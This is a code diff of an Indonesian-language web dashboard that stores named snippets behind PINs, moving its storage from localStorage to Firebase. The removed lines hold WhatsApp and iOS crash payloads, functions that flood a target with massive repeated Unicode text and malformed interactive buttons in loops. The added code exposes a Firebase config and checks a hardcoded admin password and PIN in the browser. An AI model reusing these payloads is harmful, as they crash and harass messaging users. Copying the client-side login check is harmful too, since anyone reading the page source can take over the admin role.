@@ -128,143 +128,26 @@
 <audio id="clickSound" src="https://www.myinstants.com/media/sounds/mouse-click.mp3"></audio>
 <audio id="welcomeSound" src="https://www.myinstants.com/media/sounds/startup-sound.mp3" autoplay></audio>
 
+<!-- Firebase CDN -->
+<script src="https://www.gstatic.com/firebasejs/9.24.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.24.0/firebase-database-compat.js"></script>
+
 <script>
-const defaultButtons = [
-  { name: "Buy website", content: "chat saja t.me/XyHanzyy", pin: "" },
-  { name: "FunctionsFC", content: "async function VampNotif2(target, ptcp = true) {
-            let msg = await generateWAMessageFromContent(target, {
-                viewOnceMessage: {
-                    message: {
-                        interactiveMessage: {
-                            header: {
-                                title: "𝗩𝗮𝗺𝗽𝗶𝗿𝗲",
-                                hasMediaAttachment: true
-                            },
-                            body: {
-                                text: "𝗧𝗿𝗮𝗹𝗮𝗹𝗲𝗿𝗼... 𝗧𝗿𝗮𝗹𝗮𝗹𝗮" + "ꦽ".repeat(9000) + "ꦾ".repeat(9000),
-                            },
-                            nativeFlowMessage: {
-                                messageParamsJson: "",
-                                buttons: [{
-                                        name: "single_select",
-                                        buttonParamsJson: "\u0003"
-                                    },
-                                    {
-                                        name: "call_permission_request",
-                                        buttonParamsJson: "\u0003"
-                                    }
-                                ]
-                            }
-                        }
-                    }
-                }
-            }, {});            
-            await sock.relayMessage(target, msg.message, ptcp ? {
-				participant: {
-					jid: target
-				}
-			} : {});
-            console.log(chalk.red("Vampire Success Sending Bug"));
-        }
-        
-        
-const VampApiUi = JSON.stringify({
-  status: true,
-  criador: "VampireUI",
-  resultado: {
-    type: "md",
-    ws: {
-      _events: {
-        "CB:ib,,dirty": ["Array"]
-      },
-      _eventsCount: 800000,
-      _maxListeners: 0,
-      url: "wss://web.whatsapp.com/ws/chat",
-      config: {
-        version: ["Array"],
-        browser: ["Array"],
-        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
-        sockCectTimeoutMs: 20000,
-        keepAliveIntervalMs: 30000,
-        logger: {},
-        printQRInTerminal: false,
-        emitOwnEvents: true,
-        defaultQueryTimeoutMs: 60000,
-        customUploadHosts: [],
-        retryRequestDelayMs: 250,
-        maxMsgRetryCount: 5,
-        fireInitQueries: true,
-        auth: { Object: "authData" },
-        markOnlineOnsockCect: true,
-        syncFullHistory: true,
-        linkPreviewImageThumbnailWidth: 192,
-        transactionOpts: { Object: "transactionOptsData" },
-        generateHighQualityLinkPreview: false,
-        options: {},
-        appStateMacVerification: { Object: "appStateMacData" },
-        mobile: true
-      }
-    }
-  }
-});
+const firebaseConfig = {
+  apiKey: "AIzaSyCWxa6RRAC9n2X42Bdd901gAkeRYPCeVac",
+  authDomain: "simpananhanzyy.firebaseapp.com",
+  databaseURL: "https://simpananhanzyy-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "simpananhanzyy",
+  storageBucket: "simpananhanzyy.firebasestorage.app",
+  messagingSenderId: "1097816809849",
+  appId: "1:1097816809849:web:dbca6705e7a35c08f1cfa8",
+  measurementId: "G-23SQDWGSDH"
+};
 
-async function VampNotifCrash(target) {
-  sock.relayMessage(
-    target,
-    {
-      interactiveMessage: {
-        header: {
-          title: "𝗩𝗮𝗺𝗽𝗶𝗿𝗲 𝗖𝗵𝗶𝗺𝗽𝗮𝗻𝘇𝗶𝗻𝗶 𝗕𝗮𝗻𝗮𝗻𝗶𝗻𝗶\n\n" + "ꦽ".repeat(5000),
-          hasMediaAttachment: false
-        },
-        body: {
-          text: "ꦾ".repeat(5000) + "ꦽ".repeat(5000),
-        },
-        nativeFlowMessage: {
-          messageParamsJson: "{".repeat(5000),
-          buttons: [
-            { name: "single_select", buttonParamsJson: VampApiUi },
-            { name: "payment_method", buttonParamsJson: VampApiUi },
-            { name: "form_message", buttonParamsJson: VampApiUi },
-            { name: "catalog_message", buttonParamsJson: VampApiUi },
-            { name: "send_location", buttonParamsJson: VampApiUi },
-            { name: "review_and_pay", buttonParamsJson: VampApiUi }
-          ]
-        }
-      }
-    },
-    { participant: { jid: target } }
-  );
-}
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+const simpananRef = db.ref("simpanan");
 
-async function VampUiAttack(target) {
-    for (let i = 0; i <= 50; i++) {
-    await VampNotif2(target, ptcp = true)
-    await VampNotifCrash(target)
-    }
-
-}", pin: "" },
-  { name: "FunctionsIOS", content: "async function loadedIos(isTarget) {
-await client.sendMessage(isTarget, {
-text: "🧪‌⃰Ꮡ‌‌" + "⛧ ⊺ΛϻΛ :: CONCƱΣЯЯOR ⛧" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
-contextInfo: {
-externalAdReply: {
-title: `⛧ ⊺ΛϻΛ :: CONCƱΣЯЯOR ⛧`,
-body: `Haii ${pushname}`,
-previewType: "PHOTO",
-thumbnail: "",
-sourceUrl: `https://example.com/tama`
-}
-}
-}, { quoted: m })
-}
-
-for (let r = 0; r 100; r++) {
-await closeIos(isTarget) 
-}", pin: "" }
-];
-const adminPassword = "hanzy";
-const adminPIN = "56";
 let isAdmin = false;
 
 function loginUser() {
@@ -278,45 +161,51 @@ function showDashboard() {
   document.getElementById("login-page").style.display = "none";
   document.getElementById("dashboard").style.display = "block";
   document.getElementById("user-greet").textContent = localStorage.getItem("username");
+  loadButtonsFromFirebase();
+}
 
-  let buttons = JSON.parse(localStorage.getItem("simpananButtons")) || defaultButtons;
-  const btnList = document.getElementById("button-list");
-  btnList.innerHTML = "";
+function loadButtonsFromFirebase() {
+  simpananRef.once("value", (snapshot) => {
+    const buttons = snapshot.val() || {};
+    const btnList = document.getElementById("button-list");
+    btnList.innerHTML = "";
 
-  buttons.forEach((btn, index) => {
-    const wrap = document.createElement("div");
-    wrap.className = "btn-item";
+    Object.keys(buttons).forEach(key => {
+      const btn = buttons[key];
+      const wrap = document.createElement("div");
+      wrap.className = "btn-item";
 
-    const b = document.createElement("button");
-    b.textContent = btn.name;
-    b.onclick = () => {
-      document.getElementById("clickSound").play();
-      if (isAdmin) {
-        document.getElementById("new-button-name").value = btn.name;
-        document.getElementById("new-file-content").value = btn.content;
-        document.getElementById("new-button-pin").value = btn.pin || "";
-        alert("📌 Data dimuat untuk diedit");
-      } else {
-        if (btn.pin && btn.pin.trim() !== "") {
-          const inputPIN = prompt(`Masukkan PIN untuk "${btn.name}"`);
-          if (inputPIN === btn.pin) showFile(btn.content);
-          else alert("PIN salah!");
+      const b = document.createElement("button");
+      b.textContent = btn.name;
+      b.onclick = () => {
+        document.getElementById("clickSound").play();
+        if (isAdmin) {
+          document.getElementById("new-button-name").value = btn.name;
+          document.getElementById("new-file-content").value = btn.content;
+          document.getElementById("new-button-pin").value = btn.pin || "";
+          alert("📌 Data dimuat untuk diedit");
         } else {
-          showFile(btn.content);
+          if (btn.pin) {
+            const inputPIN = prompt(`Masukkan PIN untuk "${btn.name}"`);
+            if (inputPIN === btn.pin) showFile(btn.content);
+            else alert("PIN salah!");
+          } else {
+            showFile(btn.content);
+          }
         }
+      };
+      wrap.appendChild(b);
+
+      if (isAdmin) {
+        const del = document.createElement("button");
+        del.textContent = "×";
+        del.className = "btn-delete";
+        del.onclick = () => deleteSimpanan(key);
+        wrap.appendChild(del);
       }
-    };
-    wrap.appendChild(b);
 
-    if (isAdmin) {
-      const del = document.createElement("button");
-      del.textContent = "×";
-      del.className = "btn-delete";
-      del.onclick = () => deleteSimpanan(index);
-      wrap.appendChild(del);
-    }
-
-    btnList.appendChild(wrap);
+      btnList.appendChild(wrap);
+    });
   });
 }
 
@@ -329,7 +218,7 @@ function showFile(content) {
 function adminLogin() {
   const inputPass = document.getElementById("admin-pass").value;
   const inputPIN = prompt("Masukkan PIN Admin:");
-  if (inputPass === adminPassword && inputPIN === adminPIN) {
+  if (inputPass === "hanzy" && inputPIN === "56") {
     isAdmin = true;
     sessionStorage.setItem("admin", "true");
     document.getElementById("admin-controls").style.display = "block";
@@ -343,34 +232,20 @@ function adminLogin() {
 function addNewSimpanan() {
   const name = document.getElementById("new-button-name").value.trim();
   const content = document.getElementById("new-file-content").value.trim();
-  const pin = document.getElementById("new-button-pin").value.trim(); // bisa kosong
-
+  const pin = document.getElementById("new-button-pin").value.trim();
   if (!name || !content) return alert("Nama dan isi wajib diisi!");
-
-  let buttons = JSON.parse(localStorage.getItem("simpananButtons")) || defaultButtons;
-  const existing = buttons.find(b => b.name === name);
-  if (existing) {
-    existing.content = content;
-    existing.pin = pin;
-  } else {
-    buttons.push({ name, content, pin });
-  }
-
-  localStorage.setItem("simpananButtons", JSON.stringify(buttons));
+  const key = name.replace(/\s+/g, "_");
+  simpananRef.child(key).set({ name, content, pin });
   alert("✅ Simpanan disimpan!");
   showDashboard();
-
-  // Kosongkan field
   document.getElementById("new-button-name").value = "";
   document.getElementById("new-file-content").value = "";
   document.getElementById("new-button-pin").value = "";
 }
 
-function deleteSimpanan(index) {
+function deleteSimpanan(key) {
   if (!confirm("Yakin hapus simpanan ini?")) return;
-  let buttons = JSON.parse(localStorage.getItem("simpananButtons")) || defaultButtons;
-  buttons.splice(index, 1);
-  localStorage.setItem("simpananButtons", JSON.stringify(buttons));
+  simpananRef.child(key).remove();
   showDashboard();
 }
 
@@ -381,7 +256,7 @@ window.onload = () => {
   }
 };
 
-// Animasi partikel bintang
+// Partikel animasi bintang
 const canvas = document.getElementById("particle-canvas");
 const ctx = canvas.getContext("2d");
 let particles = [];
